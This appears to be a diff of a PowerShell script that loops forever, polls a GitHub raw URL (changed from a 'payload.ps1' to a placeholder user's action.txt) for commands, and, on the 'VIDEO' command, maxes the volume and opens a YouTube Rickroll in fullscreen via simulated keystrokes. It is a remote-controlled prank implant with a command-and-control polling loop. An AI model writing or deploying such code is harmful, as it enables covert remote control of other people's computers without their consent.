@@ -1,4 +1,4 @@
-$urlOrdem = "https://raw.githubusercontent.com/Thiii123/my-tools/refs/heads/main/payload.ps1"
+$urlOrdem = "https://raw.githubusercontent.com/SEU_USUARIO/my-tools/main/action.txt"
 
 while($true) {
     try {
@@ -8,7 +8,7 @@ while($true) {
         if ($comando -eq "VIDEO") {
             $obj = New-Object -ComObject WScript.Shell
             for($i=0; $i -le 50; $i++) { $obj.SendKeys([char]175) }
-            start "https://www.youtube.com/watch?v=qHoAEWK59nE&list=RDqHoAEWK59nE&start_radio=1"
+            start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
             Start-Sleep -Seconds 5
             $obj.SendKeys('f')
             
